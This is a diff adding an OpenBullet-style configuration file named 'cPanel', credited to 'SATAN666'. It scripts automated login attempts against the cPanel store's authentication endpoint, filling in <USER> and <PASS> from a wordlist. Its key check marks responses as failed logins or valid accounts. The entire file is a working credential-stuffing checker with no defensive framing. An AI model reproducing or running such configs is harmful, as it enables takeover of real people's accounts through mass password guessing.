@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "cPanel",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-09-06T02:40:34.2775433+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://store.cpanel.net/login/authenticate" 
+  CONTENT "action=login&json=1&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 72" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://store.cpanel.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Referer: https://store.cpanel.net/login/?redirect=%2fmy%2f" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "csrf_token" 
+
